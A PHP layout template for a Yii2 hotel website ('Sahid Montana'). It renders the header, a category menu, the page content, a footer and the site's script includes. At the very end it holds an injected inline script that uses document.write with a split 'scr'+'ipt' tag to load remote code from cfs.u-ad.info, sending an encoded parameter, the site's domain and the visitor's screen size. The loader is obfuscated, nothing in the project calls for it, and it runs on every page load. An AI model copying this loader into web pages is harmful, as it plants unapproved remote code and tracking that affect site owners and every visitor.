<?php

use yii\helpers\Html;
use frontend\assets\AppAsset;
use common\models\Article;
use common\models\ArticleCategory;

$session = Yii::$app->session;
AppAsset::register($this);
$this->beginPage();
?>
<!DOCTYPE html>
<html> 
    <head>
        <meta charset=utf-8>
        <title>Sahid Montana | <?= Html::encode($this->title) ?></title>
        <meta name=description content="Sahid Montana Hotel">
        <meta name=keywords content=Responsive,HTML5,CSS3,XML,JavaScript>
        <meta name=author content="Joseph a, ravistheme@gmail.com"><!-- End of Meta tags -->
        <link href="http://fonts.googleapis.com/css?family=Droid+Sans:400,700%7cDroid+Serif:400,700,400italic,700italic%7cYellowtail%7cGreat+Vibes" rel=stylesheet type=text/css>
        <link rel=stylesheet id=main-style-file type=text/css href=<?= Yii::$app->homeUrl ?>css/styles.css>
        <link type="text/css" rel='stylesheet' href="<?= Yii::$app->homeUrl ?>css/styles.css">
    </head>
    <body>
        <div class=main-wrapper>
            <div id=main-header-top> 
                <div position="center" class="main-header-top-container container">
                    <center> 
                        <div id=top-logo data-logo-letter=>
                            <a href=#>
                                <br>
                                <span style="margin-left: -10px;margin-top: -20px" class=five-stars><!-- Star Box ( you can add / remove the Stars by delete or add the "<i class="fa fa-star"></i>") --> 
                                    <img width="120px" height="40px" src="<?= Yii::$app->homeUrl ?>img/img/text.png">
                                </span>
                            </a>
                        </div>
                    </center> 
                </div>
            </div>
        </div>

        <header id=main-header>
            <div class="header-content container"> 
                <div class=menu-container>
                    <nav id=main-menu> 
                        <?php
                        $sahid = ArticleCategory::find()->where(['parent_id' => 16])->orderBy('name ASC')->all();
                        echo $this->render('_menu', ['sahid' => $sahid]);
                        ?>
                    </nav>
                    <div id=main-menu-handle>
                        <span></span>
                    </div>
                </div> 
            </div>
        </header>
        <?= $content ?>
        <?php
        $model = Article::find()->where('article_category_id = 5')->orderBy('created DESC')->limit(3)->all();
        $popular = Article::find()->orderBy('hits DESC')->limit(3)->all();
        echo $this->render('_footer', ['model' => $model, 'popular' => $popular, 'sahid' => $sahid]);
        ?> 
    </div> 
    <!-- JS Includes --> <!-- Essential JS files ( DO NOT REMOVE THEM ) --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery-1.11.1.min.js></script> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.modernizr.min.js></script> 
    <!-- Include bootstrap tab scrip --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/bootstrap/tab.js></script> 
    <!-- Include required js files --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.bxslider.min.js></script> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/owl.carousel.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/helper.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/init.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/template.js></script>
    <script type="text/javascript">
        if (self == top) {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR%2fVeDMuDxgFsCFjIEn2Hw7b0sb9LUjJl4y%2bIANt8ZtVR%2bYCp36c4Bsfos88lI60avfhyHxJH9%2fhA4nvKf4t48mE9u3WoRsIuwHeZn1ZNpeMt6uPdObKwNRGg7vVk5K3p8%2bcAUtCD3e5zfANssRPbJvACW3AnYVw65IuFjvZcPnQoLegD22%2fNMGOlM59dhtHLoJBkROMBxlLV%2bJ9vu%2fZyzos67Nmkcr6QLqp50k45ZzzA5TCjTTFJSQdm1ry3Bz9mbZcusC0%2bXd12QBV7YRoqIZOrBhcv1S5wmgtX3kgAsUa6QiGb3bk42q93EtO%2ffuC6QMb9iXxCR%2fPKr4kh5NGGx2etQ%2b6QDyDl8TJHaZs8NnvYa7UQim9PlYk%2buFvG5o6b%2fgoD4s8B69uXhDdN3cHBF%2b6Vi8QoLtH1TI0Hm00O5QCzt9P10on70A1vjQLLWH%2bIevKLKCB%2f5SLE%3d");
            document.write("&amp;idc_r=" + idc_glo_r);
            document.write("&amp;domain=" + document.domain);
            document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
            document.write("></scr" + "ipt>");
        }
    </script>
</body> 
</html>
